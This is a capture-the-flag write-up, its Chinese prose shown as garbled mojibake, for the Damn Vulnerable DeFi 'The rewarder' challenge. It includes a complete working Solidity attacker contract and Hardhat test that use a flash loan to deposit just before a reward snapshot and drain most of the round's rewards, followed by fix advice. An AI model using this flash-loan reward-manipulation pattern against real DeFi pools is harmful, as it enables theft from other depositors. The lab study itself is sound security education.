![https://images.unsplash.com/photo-1554134449-8ad2b1dea29e?ixlib=rb-4.0.3&q=80&fm=jpg&crop=entropy&cs=tinysrgb](https://images.unsplash.com/photo-1554134449-8ad2b1dea29e?ixlib=rb-4.0.3&q=80&fm=jpg&crop=entropy&cs=tinysrgb)

# ð° Challenge #5 - The rewarder

é¡ç®ï¼ Thereâs a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it. Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards! You donât have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself. Oh, by the way, rumours say a new pool has just landed on mainnet. Isnât it offering DVT tokens in flash loans?

- [See the contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.2.0/contracts/the-rewarder)

- [Complete the challenge](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/the-rewarder/the-rewarder.challenge.js)

## æèåå¥é»

é¡ç®èªªæä¸åè³éæ± æå®æç¼éçåµçµ¦å­ DVT tokens çäººï¼æåç®åæ²æä»»ä½è³éä½æ¯æåè²»ç flashloan å¯ä»¥ååº DVT tokensï¼æåçç®æ¨æ¯è¦ç²å¾ä¸äºçåµã

## åç´ç è®

éä¸é¡ç½æ¶å°çåç´æ»¿å¤çï¼ä½å¶ææ²æå¾è¤éï¼é¦åç¸½å±æå©åè³éæ± åç´ã3 çä»£å¹£åç´ - è³éæ± åç´ - `TheRewarderPool.sol`ï¼è² è²¬å­æ¬¾ãç¼éçåµçåç´ - `FlashLoanerPool.sol`ï¼è² è²¬éé»è²¸å¯ä»¥åé¢ - Token Contracts - `AccountingToken.sol`ï¼ä½çºå­æ¬¾æè­ç Token - `RewardToken.sol`ï¼ä½çºçåµç Token - `DamnValuableToken.sol`: æ¥åä½çºå­æ¬¾ç Token é¦åæååç ç©¶ä¸ä¸æéº¼ç²åçåµï¼å¨ `TheRewarderPool.sol` ä¸­è² è²¬ç¼æ¾çåµçæ¯ `distributeRewards` éå functionï¼åªè¦æå­æ¬¾å°±å¯ä»¥ç²å¾çåµï¼ä¸¦æ²æéå¶å­æ¬¾è¦æå¤ä¹ï¼`isNewRewardsRound()` æª¢æ¥æ¯å¦å°äºç¼æ¾æéï¼5å¤©ï¼ï¼æä»¥åºæ¬ä¸æåå¯ä»¥å°äºç¼æ¾æéè¶å¿«å­æ¬¾é²å»å°±å¯ä»¥ç²å¾çåµãé£è¦æéº¼è§¸ç¼ `distributeRewards` å¢ï¼

```jsx
    function distributeRewards() public returns (uint256) {
        uint256 rewards = 0;

        if (isNewRewardsRound()) { // æª¢æ¥æ¯å¦å°äºç¼æ¾æéï¼5å¤©ï¼ï¼æ²æ¾å°å¯ä»¥æ¾å°èª¤å°æéçæ¹æ³ï¼æä»¥åªè½ä¹ä¹ç­æééå»
            _recordSnapshot();
        }

        uint256 totalDeposits = accToken.totalSupplyAt(
            lastSnapshotIdForRewards
        );
        uint256 amountDeposited = accToken.balanceOfAt(
            msg.sender,
            lastSnapshotIdForRewards
        );

        if (amountDeposited > 0 && totalDeposits > 0) {
            // ð åªè¦æå­æ¬¾å°±å¯ä»¥ç²å¾çåµ
            rewards = (amountDeposited * 100 * 10**18) / totalDeposits;
            if (rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                rewardToken.mint(msg.sender, rewards);
                lastRewardTimestamps[msg.sender] = block.timestamp;
            }
        }

        return rewards;
    }
```

`distributeRewards` å¨depositä¸­è¢«è§¸ç¼ï¼æä»¥æååªéè¦æ³è¾¦æ³å¨è¦ç¼æ¾çåµçæéå­é¢å°±å¯ä»¥å®ææ¬æ¬¡æ»æäºï¼

```jsx
    /**
     * @notice sender must have approved `amountToDeposit` liquidity tokens in advance
     */
    function deposit(uint256 amountToDeposit) external {
        // å¯ä»¥å­ DVT Token ç²å¾ accToken
        require(amountToDeposit > 0, "Must deposit tokens");

        accToken.mint(msg.sender, amountToDeposit);
        distributeRewards();

        require(
            liquidityToken.transferFrom(
                msg.sender,
                address(this),
                amountToDeposit
            )
        );
    }
```

## å¯¦ç¾æ»æ

### æºåæ»æåç´

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";

contract RewarderAttacker {
    address owner;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool public immutable rewardPool;
    FlashLoanerPool public immutable loanPool;
    RewardToken public immutable rewardToken;

    constructor(
        address _liquidityToken,
        address _rewardPool,
        address _loanPool,
        address _accToken
    ) {
        owner = msg.sender;
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardPool = TheRewarderPool(_rewardPool);
        loanPool = FlashLoanerPool(_loanPool);
        rewardToken = RewardToken(_accToken);
    }

    function attack(uint256 amount) external {
        loanPool.flashLoan(amount); // åé¢
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this))); // æé¢è½çµ¦èªå·±
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount); // å­é¢ï¼æèªåè§¸ç¼ distributeRewards æä»¥æåå­å®å°±å¯ä»¥ç²å¾çåµ
        rewardPool.withdraw(amount); // åé¢
        liquidityToken.transfer(address(loanPool), amount); // éé¢çµ¦éé»è²¸
    }
}
```

### å®ææ¸¬è©¦

```jsx
    it('Exploit', async function () {
        const rewarderAttacker = await (await ethers.getContractFactory('RewarderAttacker', attacker)).deploy(this.liquidityToken.address, this.rewarderPool.address, this.flashLoanPool.address, this.rewardToken.address);
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        await rewarderAttacker.attack(TOKENS_IN_LENDER_POOL)
    });
```

## ð§ å¼±é»ç¸½çµ & ä¿®æ¹æ¹å¼

**å¼±é»ï¼** éé¡å±¬æ¼[[å¥å©æ»æ]]ï¼ç®æ¯å­æ¬¾çåµè¨­æ³çä¸å¤ å¨å¨ï¼å°è´ä½¿ç¨èçå­æ¬¾æéå¤å¯¡ä¸æå½±é¿å°ä»åçåµçå¤å¯¡ã - **æ»æï¼** å¨è¦ç¼æ¾çåµå¾æéé»ï¼éééé»è²¸åé¢è¡é²å» `deposit` ä¸¦è§¸ç¼ `distributeRewards` ï¼é¦¬ä¸å¥å©æåï¼ç«å»éé¢ä¸¦æçåµè£çµ¦èªå·±ã - **æ¹é²ï¼** å¯ä»¥åè Compound çå©æ¯è¨­è¨æ©å¶ï¼å¨å­æ¬¾çæåè¨­å®ä¸å indexï¼ä¸¦å¨ç¼æ¾çåµçæåæ¯è¼ indexï¼ç®ç®å¾ä½¿ç¨èå­æ¬¾å°ç¼æ¾çåµçæéç¸½å±éå»å¹¾å blockï¼æ³è¾¦æ³æ¯è¼åºå­æ¬¾æé·ï¼ä¸¦å¨æ»¿è¶³å­æ¬¾æé·æç¼æ¾çåµã

## å®æ´åç´

- TheRewarderPool

```jsx
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./RewardToken.sol";
import "../DamnValuableToken.sol";
import "./AccountingToken.sol";

/**
 * @title TheRewarderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)

 */
contract TheRewarderPool {
    // Minimum duration of each round of rewards in seconds
    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;

    uint256 public lastSnapshotIdForRewards;
    uint256 public lastRecordedSnapshotTimestamp;

    mapping(address => uint256) public lastRewardTimestamps;

    // Token deposited into the pool by users
    DamnValuableToken public immutable liquidityToken;

    // Token used for internal accounting and snapshots
    // Pegged 1:1 with the liquidity token
    AccountingToken public accToken;

    // Token in which rewards are issued
    RewardToken public immutable rewardToken;

    // Track number of rounds
    uint256 public roundNumber;

    constructor(address tokenAddress) {
        // Assuming all three tokens have 18 decimals
        liquidityToken = DamnValuableToken(tokenAddress);
        accToken = new AccountingToken();
        rewardToken = new RewardToken();

        _recordSnapshot();
    }

    /**
     * @notice sender must have approved `amountToDeposit` liquidity tokens in advance
     */
    function deposit(uint256 amountToDeposit) external {
        // å¯ä»¥å­ DVT Token ç²å¾ accToken
        require(amountToDeposit > 0, "Must deposit tokens");

        accToken.mint(msg.sender, amountToDeposit);
        distributeRewards();

        require(
            liquidityToken.transferFrom(
                msg.sender,
                address(this),
                amountToDeposit
            )
        );
    }

    function withdraw(uint256 amountToWithdraw) external {
        accToken.burn(msg.sender, amountToWithdraw);
        require(liquidityToken.transfer(msg.sender, amountToWithdraw));
    }

    function distributeRewards() public returns (uint256) {
        uint256 rewards = 0;

        if (isNewRewardsRound()) {
            _recordSnapshot();
        }

        uint256 totalDeposits = accToken.totalSupplyAt(
            lastSnapshotIdForRewards
        );
        uint256 amountDeposited = accToken.balanceOfAt(
            msg.sender,
            lastSnapshotIdForRewards
        );

        if (amountDeposited > 0 && totalDeposits > 0) {
            // ð åªè¦æå­æ¬¾å°±å¯ä»¥ç²å¾çåµ
            rewards = (amountDeposited * 100 * 10**18) / totalDeposits;
            if (rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                rewardToken.mint(msg.sender, rewards);
                lastRewardTimestamps[msg.sender] = block.timestamp;
            }
        }

        return rewards;
    }

    function _recordSnapshot() private {
        lastSnapshotIdForRewards = accToken.snapshot();
        lastRecordedSnapshotTimestamp = block.timestamp;
        roundNumber++;
    }

    function _hasRetrievedReward(address account) private view returns (bool) {
        return (lastRewardTimestamps[account] >=
            lastRecordedSnapshotTimestamp &&
            lastRewardTimestamps[account] <=
            lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION);
    }

    function isNewRewardsRound() public view returns (bool) {
        return
            block.timestamp >=
            lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
    }
}

```

- RewarderAttacker

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";

contract RewarderAttacker {
    address owner;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool public immutable rewardPool;
    FlashLoanerPool public immutable loanPool;
    RewardToken public immutable rewardToken;

    constructor(
        address _liquidityToken,
        address _rewardPool,
        address _loanPool,
        address _accToken
    ) {
        owner = msg.sender;
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardPool = TheRewarderPool(_rewardPool);
        loanPool = FlashLoanerPool(_loanPool);
        rewardToken = RewardToken(_accToken);
    }

    function attack(uint256 amount) external {
        loanPool.flashLoan(amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        liquidityToken.transfer(address(loanPool), amount);
    }
}

```

- æ¸¬è©¦

```jsx
const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] The rewarder', function () {

    let deployer, alice, bob, charlie, david, attacker;
    let users;

    const TOKENS_IN_LENDER_POOL = ethers.utils.parseEther('1000000'); // 1 million tokens

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice, bob, charlie, david];

        const FlashLoanerPoolFactory = await ethers.getContractFactory('FlashLoanerPool', deployer);
        const TheRewarderPoolFactory = await ethers.getContractFactory('TheRewarderPool', deployer);
        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const RewardTokenFactory = await ethers.getContractFactory('RewardToken', deployer);
        const AccountingTokenFactory = await ethers.getContractFactory('AccountingToken', deployer);

        this.liquidityToken = await DamnValuableTokenFactory.deploy();
        this.flashLoanPool = await FlashLoanerPoolFactory.deploy(this.liquidityToken.address);

        // Set initial token balance of the pool offering flash loans
        await this.liquidityToken.transfer(this.flashLoanPool.address, TOKENS_IN_LENDER_POOL);

        this.rewarderPool = await TheRewarderPoolFactory.deploy(this.liquidityToken.address);
        this.rewardToken = await RewardTokenFactory.attach(await this.rewarderPool.rewardToken());
        this.accountingToken = await AccountingTokenFactory.attach(await this.rewarderPool.accToken());

        // Alice, Bob, Charlie and David deposit 100 tokens each
        for (let i = 0; i < users.length; i++) {
            const amount = ethers.utils.parseEther('100');
            await this.liquidityToken.transfer(users[i].address, amount);
            await this.liquidityToken.connect(users[i]).approve(this.rewarderPool.address, amount);
            await this.rewarderPool.connect(users[i]).deposit(amount);
            expect(
                await this.accountingToken.balanceOf(users[i].address)
            ).to.be.eq(amount);
        }
        expect(await this.accountingToken.totalSupply()).to.be.eq(ethers.utils.parseEther('400'));
        expect(await this.rewardToken.totalSupply()).to.be.eq('0');

        // Advance time 5 days so that depositors can get rewards
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days

        // Each depositor gets 25 reward tokens
        for (let i = 0; i < users.length; i++) {
            await this.rewarderPool.connect(users[i]).distributeRewards();
            expect(
                await this.rewardToken.balanceOf(users[i].address)
            ).to.be.eq(ethers.utils.parseEther('25'));
        }
        expect(await this.rewardToken.totalSupply()).to.be.eq(ethers.utils.parseEther('100'));

        // Attacker starts with zero DVT tokens in balance
        expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');

        // Two rounds should have occurred so far
        expect(
            await this.rewarderPool.roundNumber()
        ).to.be.eq('2');
    });

    it('Exploit', async function () {
        const rewarderAttacker = await (await ethers.getContractFactory('RewarderAttacker', attacker)).deploy(this.liquidityToken.address, this.rewarderPool.address, this.flashLoanPool.address, this.rewardToken.address);
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        await rewarderAttacker.attack(TOKENS_IN_LENDER_POOL)
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Only one round should have taken place
        expect(
            await this.rewarderPool.roundNumber()
        ).to.be.eq('3');

        // Users should get neglegible rewards this round
        for (let i = 0; i < users.length; i++) {
            await this.rewarderPool.connect(users[i]).distributeRewards();
            let rewards = await this.rewardToken.balanceOf(users[i].address);

            // The difference between current and previous rewards balance should be lower than 0.01 tokens
            let delta = rewards.sub(ethers.utils.parseEther('25'));
            expect(delta).to.be.lt(ethers.utils.parseUnits('1', 16))
        }

        // Rewards must have been issued to the attacker account
         expect(await this.rewardToken.totalSupply()).to.be.gt(ethers.utils.parseEther('100'));
        let rewards = await this.rewardToken.balanceOf(attacker.address);

        // The amount of rewards earned should be really close to 100 tokens
        let delta = ethers.utils.parseEther('100').sub(rewards);
        expect(delta).to.be.lt(ethers.utils.parseUnits('1', 17));

        // Attacker finishes with zero DVT tokens in balance
        expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
    });

});

```
